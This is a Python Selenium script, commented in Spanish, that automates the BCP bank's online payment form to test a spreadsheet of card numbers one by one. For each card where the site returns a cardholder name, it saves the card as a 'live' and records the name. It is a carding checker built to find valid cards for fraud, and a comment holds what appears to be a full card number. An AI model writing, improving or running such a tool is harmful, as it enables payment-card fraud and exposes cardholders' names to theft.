import pandas
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
from selenium.common.exceptions import WebDriverException
from os import system

excel_credenciales = r'G:\.Programacion\Pyhton\Automatizacionbot\BCP nombres\bin.xlsx'

df = pandas.read_excel(excel_credenciales,sheet_name='Hoja1')

url = 'https://bcpzonasegurabeta.viabcp.com/'

#Paths
path_ingresar ='/html/body/nhbk-root/nhbk-login/div[1]/div[1]/div/div[2]/form/div[3]/nhbk-card-number/div/div[1]/div/input'
path_tarjeta = '/html/body/nhbk-root/nhbk-home/bcp-layout/div[2]/nhbk-credit-cards/nhbk-credit-card-other-bank/bcp-wizard/bcp-viewer/nhbk-ccob-step1/div/form/nhbk-step1-bank/div/div[5]/div/nhbk-text-box/div/input'
botonerror = '/html/body/modal-container/div/div/nhbk-confirmation-modal/div/nhbk-modal-footer/div/button'
cuadronombre ='/html/body/nhbk-root/nhbk-home/bcp-layout/div[2]/nhbk-credit-cards/nhbk-credit-card-other-bank/bcp-wizard/bcp-viewer/nhbk-ccob-step1/div/form/nhbk-step1-bank/div/div[6]/nhbk-inmediate-pay/div/div/p[2]'
nombrexpath = '//*[@id="wrapper"]/div[2]/nhbk-credit-cards/nhbk-credit-card-other-bank/bcp-wizard/bcp-viewer/nhbk-ccob-step1/div/form/nhbk-step1-bank/div/div[6]/nhbk-inmediate-pay/div/div/p[2]'
boton_gmail= '/html/body/nhbk-root/nhbk-home/bcp-layout/div[2]/nhbk-credit-cards/nhbk-credit-card-other-bank/bcp-wizard/bcp-viewer/nhbk-ccob-step1/div/form/nhbk-step1-bank/div/div[7]/div/div/nhbk-text-box/div/input'
botonsaldo= '/html/body/nhbk-root/nhbk-home/bcp-layout/div[2]/nhbk-credit-cards/nhbk-credit-card-other-bank/bcp-wizard/bcp-viewer/nhbk-ccob-step1/div/form/nhbk-step1-bank/div/div[2]/div[2]/nhbk-text-box/div/input'
boton_aceptar = '/html/body/modal-container/div/div/nhbk-confirmation-modal/div/nhbk-modal-footer/div/button'
#Abriendo el navegador
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--incognito")
driver = webdriver.Chrome(chrome_options=chrome_options)
driver.get(url)
system("cls")

#Tiempo para logearme e ir a la pantalla de nombres 
print("Tienes 40 segundos para logearte e ir al apartado de tarjetas")
time.sleep(45)
print("10 segundos...")
time.sleep(10)
#4557880421332226
#Abriendo archivo tesxt
archivo = open("archivo.txt","w")
lives = open("lives.txt","w")
print("¡¡¡Corre!!!")
#Menú entrado
try:
	for i in df.index:
		tarjetas=str(df['tarjetas'][i])
		#metiendo laa tarjeta

		driver.find_element_by_xpath(path_tarjeta).clear()
		driver.find_element_by_xpath(path_tarjeta).send_keys(tarjetas)
		print(tarjetas)
		#time.sleep(1)
		#print("Clicleando boton saldo")
		driver.find_element_by_xpath(botonsaldo).click()
		#Esperando la pantalla de carga
		#Abriendo archivo
		#archivo = open("archivo.txt","w")
		try:
			#print("Intentando Loop")
			wait = WebDriverWait(driver,15)
			wait.until(ec.visibility_of_element_located((By.XPATH,boton_aceptar)))
			print("No existente")
			archivo.write("No existente\n")
			#archivo.close()
			print('-----')
			#time.sleep(5)
			#print("Clicleando boton aceptar ")
			driver.find_element_by_xpath(boton_aceptar).click()
		except:
			datos = driver.find_element_by_xpath(nombrexpath).text
			print(datos) # LiVE!!!!!
			archivo.write(datos) #Escribiendo los nombres en el block
			lives.write(tarjetas) # Escribiendo las lives en el block
			lives.write("\n")
			archivo.write("\n")
			#archivo.close()
			print('----')	
			print("next")	
		print ("Loop!")
		#time.sleep(1)
except Exception as e:
	print('----------')
	print('----------')
	print("Error en el programa")
print("Fin Del Programa!!!")
archivo.close()
lives.close()
driver.close()
time.sleep(5)

